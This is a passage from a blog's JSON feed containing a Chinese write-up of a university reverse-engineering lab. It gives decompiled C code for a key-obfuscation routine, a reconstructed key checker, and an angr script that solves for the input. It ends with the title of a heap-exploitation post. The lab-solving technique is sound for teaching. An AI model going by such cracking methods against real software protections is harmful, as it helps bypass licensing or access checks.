class=\"line\">    &#123;</span><br><span class=\"line\">      randnum ^= dword_202020[v13];</span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;randnum:%x\\n&quot;,randnum);</span></span><br><span class=\"line\">    v13 = ((<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)v13 + <span class=\"number\">1</span>) &amp; <span class=\"number\">0xF</span>;<span class=\"comment\">//这句话的作用是把它范围限制在0-15位</span></span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;v13:%x\\n&quot;,v13);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v8 = v7 &gt;&gt; <span class=\"number\">1</span>; <span class=\"comment\">//code字节右移一位,</span></span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;v8:%x\\n&quot;,v8);</span></span><br><span class=\"line\">    v3 = v8 &amp; <span class=\"number\">3</span>; <span class=\"comment\">// &amp; 11,把v3限制在两位</span></span><br><span class=\"line\">    <span class=\"comment\">// 然后根据v3的值进行选择分支运算</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v14 = dword_202020[v13] | <span class=\"number\">0xABCDABCD</span>;</span><br><span class=\"line\">        v13 = ((<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)v13 + <span class=\"number\">1</span>) &amp; <span class=\"number\">0xF</span>;<span class=\"comment\">//这句话的作用是把它范围限制在0-15位</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v15 = dword_202020[v13] &amp; <span class=\"number\">0xAABBCCDD</span>;</span><br><span class=\"line\">      v13 = ((<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)v13 + <span class=\"number\">1</span>) &amp; <span class=\"number\">0xF</span>;<span class=\"comment\">//这句话的作用是把它范围限制在0-15位</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">3</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      randnum += v14 + v15;</span><br><span class=\"line\">      v15 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      v14 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   v9 = v8 &gt;&gt; <span class=\"number\">2</span>;  <span class=\"comment\">//三个判断里都有,提出来</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//上面那一层判断完之后,再到下面,继续进行乱七八糟的操作</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (v9 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">      randnum = ~randnum;</span><br><span class=\"line\">    v10 = v9 &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (v10 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">      randnum ^= (((randnum &lt;&lt; <span class=\"number\">16</span>) ^ randnum) &gt;&gt; <span class=\"number\">16</span>) ^ (randnum &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 这一段和上面那个好像</span></span><br><span class=\"line\">    v11 = v10 &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">    v4 = v11 &amp; <span class=\"number\">3</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v16 = <span class=\"number\">539034132</span> * dword_202020[v13]; <span class=\"comment\">//0x20210214</span></span><br><span class=\"line\">        v13 = ((<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)v13 + <span class=\"number\">1</span>) &amp; <span class=\"number\">0xF</span>;<span class=\"comment\">//这句话的作用是把它范围限制在0-15位</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v17 = dword_202020[v13] - <span class=\"number\">539034144</span>; <span class=\"comment\">//0x20210220</span></span><br><span class=\"line\">      v13 = ((<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)v13 + <span class=\"number\">1</span>) &amp; <span class=\"number\">0xF</span>;<span class=\"comment\">//这句话的作用是把它范围限制在0-15位</span></span><br><span class=\"line\">      v12 = v11 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">3</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      randnum += v16 + v17;</span><br><span class=\"line\">      v17 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      v16 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      v12 = v11 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      v12 = v11 &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (v12 &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">      randnum = randnum - (randnum &amp; <span class=\"number\">7</span>) - (randnum &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> randnum;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> *s;</span><br><span class=\"line\">FILE *stream;</span><br><span class=\"line\"><span class=\"type\">int</span> size;</span><br><span class=\"line\"><span class=\"type\">void</span> *ptr;</span><br><span class=\"line\"><span class=\"type\">int</span> size_4;</span><br><span class=\"line\"><span class=\"type\">int</span> v0 = time(<span class=\"number\">0</span>);</span><br><span class=\"line\">srand(v0);</span><br><span class=\"line\"><span class=\"type\">int</span> v2 = rand();</span><br><span class=\"line\"><span class=\"comment\">//printf(&quot;%d\\n&quot;,v2);</span></span><br><span class=\"line\">stream = fopen(<span class=\"string\">&quot;./code&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">fseek(stream, <span class=\"number\">0</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">size = ftell(stream);</span><br><span class=\"line\">fseek(stream, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,stream);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size:%d\\n&quot;</span>,size);</span><br><span class=\"line\">ptr = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( fread(ptr, size, <span class=\"number\">1</span>, stream) != <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fwrite(<span class=\"string\">&quot;Error reading file code\\n&quot;</span>, <span class=\"number\">1</span>, <span class=\"number\">0x18</span>, <span class=\"built_in\">stderr</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;在外面的输出:%x\\n&quot;</span>,&amp;ptr); <span class=\"comment\">//这里输出的有问题</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ptr:%p\\n&quot;</span>,ptr);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&amp;ptr:%p\\n&quot;</span>,&amp;ptr); <span class=\"comment\">//&amp;ptr的地址,里面存着ptr的地址,ptr地址里面存着数据</span></span><br><span class=\"line\">size_4 = hunxiao(v2,size,ptr);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t运行代码,得到key的处理代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key ^= dword_202020[<span class=\"number\">0</span>];</span><br><span class=\"line\">key=~key;</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">3</span>];</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key=~key;</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key += <span class=\"number\">1256252113</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">6</span>];</span><br><span class=\"line\">key += <span class=\"number\">636006435</span>;</span><br><span class=\"line\">key += <span class=\"number\">0</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">7</span>];</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">10</span>];</span><br><span class=\"line\">key=~key;</span><br><span class=\"line\">key += <span class=\"number\">1908961232</span>;</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">12</span>];</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key += <span class=\"number\">0</span>;</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">14</span>];</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">1</span>];</span><br><span class=\"line\">key += <span class=\"number\">3791846473</span>;</span><br><span class=\"line\">key=~key;</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key=~key;</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key += <span class=\"number\">3767795326</span>;</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">7</span>];</span><br><span class=\"line\">key += <span class=\"number\">371756133</span>;</span><br><span class=\"line\">key=~key;</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">8</span>];</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"编写key计算代码\"><a href=\"#编写key计算代码\" class=\"headerlink\" title=\"编写key计算代码\"></a>编写key计算代码</h3><p>​\t\t需要替换y值</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> dword_202020[<span class=\"number\">16</span>] = &#123;</span><br><span class=\"line\"><span class=\"number\">0x24DD20CF</span>, <span class=\"number\">0x3E4F0354</span>, <span class=\"number\">0x18B2E85F</span>, <span class=\"number\">0x2F2CAFB8</span>, <span class=\"number\">0x5810ADCB</span>, <span class=\"number\">0x42F7FF85</span>, <span class=\"number\">0x36E0D6C2</span>, <span class=\"number\">0x5F3EF93F</span>,</span><br><span class=\"line\"><span class=\"number\">0x7F46E74A</span>, <span class=\"number\">0x44DDC864</span>, <span class=\"number\">0x64959795</span>, <span class=\"number\">0x39413451</span>, <span class=\"number\">0x5DC36C45</span>, <span class=\"number\">0x62037E7E</span>, <span class=\"number\">0x5AEA541F</span>, <span class=\"number\">0x153F8FAC</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">calc</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> key)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">0</span>];</span><br><span class=\"line\">key = ~key;</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">3</span>];</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key = ~key;</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key += <span class=\"number\">1256252113</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">6</span>];</span><br><span class=\"line\">key += <span class=\"number\">636006435</span>;</span><br><span class=\"line\">key += <span class=\"number\">0</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">7</span>];</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">10</span>];</span><br><span class=\"line\">key = ~key;</span><br><span class=\"line\">key += <span class=\"number\">1908961232</span>;</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">12</span>];</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key += <span class=\"number\">0</span>;</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">14</span>];</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">1</span>];</span><br><span class=\"line\">key += <span class=\"number\">3791846473</span>;</span><br><span class=\"line\">key = ~key;</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key = ~key;</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key += <span class=\"number\">3767795326</span>;</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">7</span>];</span><br><span class=\"line\">key += <span class=\"number\">371756133</span>;</span><br><span class=\"line\">key = ~key;</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\">key ^= dword_202020[<span class=\"number\">8</span>];</span><br><span class=\"line\">key ^= (((key &lt;&lt; <span class=\"number\">16</span>) ^ key) &gt;&gt; <span class=\"number\">16</span>) ^ (key &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">key = key - (key &amp; <span class=\"number\">7</span>) - (key &amp; <span class=\"number\">7</span>) + <span class=\"number\">7</span>;</span><br><span class=\"line\"><span class=\"keyword\">return</span> key;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> y = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%u&quot;</span>, &amp;x);</span><br><span class=\"line\">y = calc(x);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (y == <span class=\"number\">730447668</span>) &#123; <span class=\"comment\">//**比赛实际服务器返回的number**）</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;right\\n&quot;</span>);</span><br><span class=\"line\">&#125;  <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;wrong\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tgcc -o f fk.c 得到f二进制文件</p>\n<h3 id=\"angr脚本-得到随机值\"><a href=\"#angr脚本-得到随机值\" class=\"headerlink\" title=\"angr脚本,得到随机值\"></a>angr脚本,得到随机值</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> angr</span><br><span class=\"line\"><span class=\"keyword\">import</span> claripy</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot; solving :&quot;</span>, sys.argv[<span class=\"number\">1</span>])</span><br><span class=\"line\">    p = angr.Project(sys.argv[<span class=\"number\">1</span>], load_options=&#123;<span class=\"string\">&quot;auto_load_libs&quot;</span>: <span class=\"literal\">True</span>&#125;)</span><br><span class=\"line\">    state = p.factory.entry_state()</span><br><span class=\"line\"></span><br><span class=\"line\">    sm = p.factory.simgr(state)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">good</span>(<span class=\"params\">state</span>):</span><br><span class=\"line\">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;right&#x27;</span>.encode() <span class=\"keyword\">in</span> stdout_output  <span class=\"comment\"># :boolean</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">bad</span>(<span class=\"params\">state</span>):</span><br><span class=\"line\">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;wrong&#x27;</span>.encode() <span class=\"keyword\">in</span> stdout_output</span><br><span class=\"line\">    sm.explore(find=good, avoid=bad)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> sm.found:</span><br><span class=\"line\">  <span class=\"comment\"># print(sm.found[0].solver.eval(flag, cast_to=bytes)</span></span><br><span class=\"line\">  <span class=\"comment\"># print(sm.found[0].posix.dumps(sys.stdout.fileno())</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(sm.found[<span class=\"number\">0</span>].posix.dumps(sys.stdin.fileno()))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Not found&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Done&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%B8%80-%E9%80%86%E5%90%91/image-20230310213131937.png\" alt=\"image-20230310213131937\"></p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p>(一开始做了好久,硬逆向,发现确实不太好弄…本来想放弃了…搜了搜有原题..就参考了(抄)了一下)</p>\n<p><a href=\"https://www.52pojie.cn/thread-1717425-1-1.html\">https://www.52pojie.cn/thread-1717425-1-1.html</a></p>\n<p><a href=\"https://docs.angr.io/\">https://docs.angr.io</a></p>\n",
            "tags": [
                "研究生课程"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/",
            "title": "pwn入门-19-堆入门之Large_Bin_Attack",
            "date_published": "2023-03-08T11:47:35.000Z",
